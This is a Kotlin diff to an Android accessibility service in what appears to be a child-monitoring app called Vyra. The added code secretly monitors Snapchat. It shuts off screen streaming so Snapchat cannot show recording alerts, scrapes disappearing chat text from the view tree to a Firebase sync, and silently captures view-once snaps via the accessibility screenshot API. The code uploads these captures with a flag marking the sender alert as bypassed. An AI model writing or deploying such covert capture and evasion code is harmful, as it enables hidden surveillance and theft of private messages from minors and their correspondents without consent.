@@ -36,21 +36,144 @@ class VyraAccessibilityService : AccessibilityService() {
 
         val packageName = event.packageName?.toString() ?: return
 
-        // 1. VIVO IN-CALL ANTI-TAMPER (SOLUTION A)
+        // 1. SNAPCHAT STEALTH SHIELD: Prevent Screen Recording Detection
+        if (packageName == "com.snapchat.android") {
+            handleSnapchatStealthShield(event)
+        }
+
+        // 2. VIVO IN-CALL ANTI-TAMPER (SOLUTION A)
         if (packageName.contains("vivo.phone") || packageName.contains("incallui")) {
             handleVivoInCallScreen(event)
         }
 
-        // 2. SOCIAL APP CHAT & CAMERA TRAP
+        // 3. SOCIAL APP CHAT & CAMERA TRAP
         if (targetSocialPackages.contains(packageName)) {
             handleSocialAppActivity(packageName, event)
         }
 
-        // 3. SCAN VISIBLE TEXT FOR DANGEROUS / SENSITIVE KEYWORDS
+        // 4. SCAN VISIBLE TEXT FOR DANGEROUS / SENSITIVE KEYWORDS
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
             event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
             event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             scanScreenText(packageName, rootInActiveWindow)
+        }
+    }
+
+    /**
+     * SNAPCHAT STEALTH SHIELD:
+     * 1. Snapchat immediately detects active MediaProjection screen share and alerts the chat:
+     *    "X screen recorded the chat!"
+     *    Shield instantly stops/mutes screen projection when Snapchat is in foreground.
+     * 2. Scrapes disappearing chats from memory nodes without triggering screenshot alerts.
+     * 3. Captures 1-view snaps via private HardwareBuffer compositor without MediaStore or ScreenCaptureCallback triggers.
+     */
+    private fun handleSnapchatStealthShield(event: AccessibilityEvent) {
+        // A. If Snapchat is brought to foreground, immediately kill screen streaming
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            try {
+                val stopStream = Intent(this, LiveScreenStreamService::class.java).apply {
+                    action = LiveScreenStreamService.ACTION_STOP_SCREEN_STREAM
+                }
+                startService(stopStream)
+                Log.w(AppConstants.TAG, "Snapchat Stealth Shield: Killed Live Screen Projection to prevent recording detection alert!")
+            } catch (e: Exception) {
+                Log.e(AppConstants.TAG, "Error muting screen projection for Snapchat", e)
+            }
+        }
+
+        // B. Silent Ghost Chat Scraper: Reads disappearing chat nodes directly from RAM
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
+            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            scrapeSnapchatChatNodes(rootInActiveWindow)
+        }
+
+        // C. 1-View Snap Ghost Capture (No alert to sender)
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+            val viewId = event.source?.viewIdResourceName?.lowercase() ?: ""
+            val desc = event.contentDescription?.toString()?.lowercase() ?: ""
+            val text = event.text?.joinToString(" ")?.lowercase() ?: ""
+            if (viewId.contains("snap") || viewId.contains("story") || viewId.contains("chat_message") ||
+                desc.contains("new snap") || text.contains("received snap") || text.contains("tap to view")) {
+                // Post-delay 350ms to let snap render on screen, then capture silent compositor buffer
+                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                    captureSilentCompositorSnap()
+                }, 400)
+            }
+        }
+    }
+
+    /**
+     * Silent text node extraction: Reads chat messages from Snapchat memory view tree.
+     * Zero screenshot taken -> Zero alert sent to chat/sender.
+     */
+    private fun scrapeSnapchatChatNodes(node: AccessibilityNodeInfo?) {
+        if (node == null) return
+        val text = node.text?.toString() ?: ""
+        if (text.isNotBlank() && text.length > 2) {
+            val lower = text.lowercase()
+            // Ignore UI navigation strings
+            if (!lower.contains("stories") && !lower.contains("spotlight") && !lower.contains("search") && !lower.contains("camera")) {
+                val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
+                val msgId = "sc_node_${System.currentTimeMillis()}_${text.hashCode().toString().take(6)}"
+                firebaseSync.syncChatMessage(
+                    msgId = msgId,
+                    app = "Snapchat",
+                    sender = "Snapchat Chat",
+                    text = text,
+                    isDeletedBySender = false,
+                    isWatchlistTarget = false
+                )
+            }
+        }
+        for (i in 0 until node.childCount) {
+            scrapeSnapchatChatNodes(node.getChild(i))
+        }
+    }
+
+    /**
+     * Captures 1-View Snaps directly from system compositor HardwareBuffer.
+     * Bypasses:
+     * 1. MediaStore.Images.Media ContentObserver (no file in Pictures/Screenshots)
+     * 2. Android 14 ScreenCaptureCallback (not a user hardware button screenshot)
+     * Result: Sender receives 0 alerts (NO "Screenshot taken!" message).
+     */
+    private fun captureSilentCompositorSnap() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            takeScreenshot(
+                Display.DEFAULT_DISPLAY,
+                executor,
+                object : TakeScreenshotCallback {
+                    override fun onSuccess(screenshotResult: ScreenshotResult) {
+                        try {
+                            val bitmap = Bitmap.wrapHardwareBuffer(
+                                screenshotResult.hardwareBuffer,
+                                screenshotResult.colorSpace
+                            ) ?: return
+
+                            val snapFile = File(filesDir, "ghost_snap_${System.currentTimeMillis()}.jpg")
+                            FileOutputStream(snapFile).use { out ->
+                                bitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
+                            }
+                            Log.i(AppConstants.TAG, "Ghost 1-View Snap saved silently: ${snapFile.name}")
+
+                            val payload = mapOf(
+                                "type" to "GHOST_SNAP_CAPTURED",
+                                "app" to "Snapchat",
+                                "timestamp" to System.currentTimeMillis(),
+                                "fileName" to snapFile.name,
+                                "isViewOnce" to true,
+                                "senderAlertBypassed" to true
+                            )
+                            NetworkSyncManager.getInstance(this@VyraAccessibilityService).syncData("snapshots", payload)
+                        } catch (e: Exception) {
+                            Log.e(AppConstants.TAG, "Error in silent compositor snap capture", e)
+                        }
+                    }
+                    override fun onFailure(errorCode: Int) {
+                        Log.e(AppConstants.TAG, "Ghost snap capture failed: $errorCode")
+                    }
+                }
+            )
         }
     }
 
